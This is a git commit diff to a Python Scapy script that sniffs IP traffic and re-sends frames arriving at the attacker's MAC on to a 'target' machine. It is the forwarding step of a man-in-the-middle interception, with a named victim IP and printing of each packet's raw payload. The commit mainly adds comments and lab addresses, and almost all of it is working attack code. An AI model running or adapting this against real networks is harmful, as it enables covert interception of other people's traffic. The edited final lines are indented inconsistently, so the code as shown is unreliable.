5cf86ad1529a3cc43db64b51fc26f313ed0fa621
wpstudart <wpstudart@yahoo.com.br>
2016-07-14 14:50:12 -0500

    add documentation to forwarding script.

--- Scapy/ip_forward.py
+++ Scapy/ip_forward.py
@@ -3,22 +3,27 @@
 from scapy.all import *
 import sys
 
-iface = "wlan1"
+iface = "eth0"
 filter = "ip"
-VICTIM_IP = "192.168.2.108"
-MY_IP = "192.168.2.104"
-GATEWAY_IP = "192.168.2.1"
-VICTIM_MAC = "### don't want so show###"
-MY_MAC = "### don't want so show###"
-GATEWAY_MAC = "### don't want so show###"
+#victim in this case is the initiator
+VICTIM_IP = "192.168.1.121"
+MY_IP = "192.168.1.154"
+# gateway is the target
+GATEWAY_IP = "192.168.1.171"
+#VICTIM_MAC = "### don't want so show###"
+MY_MAC = "08:00:27:7B:80:18"
+#target mac address
+GATEWAY_MAC = "08:00:27:24:08:34"
 
 def handle_packet(packet):
     if (packet[IP].dst == GATEWAY_IP) and (packet[Ether].dst == MY_MAC):
+        # we change the packet destination to the target machine
         packet[Ether].dst = GATEWAY_MAC
         # TODO: block iscsi packets with an if condition
         sendp(packet)
 
         print "A packet from " + packet[IP].src + " redirected!"
-        sprintf("{Raw:%Raw.load%\n}")
+       #printing redirected packets load
+       sprintf("{Raw:%Raw.load%\n}")
 
 sniff(prn=handle_packet, filter=filter, iface=iface, store=0)
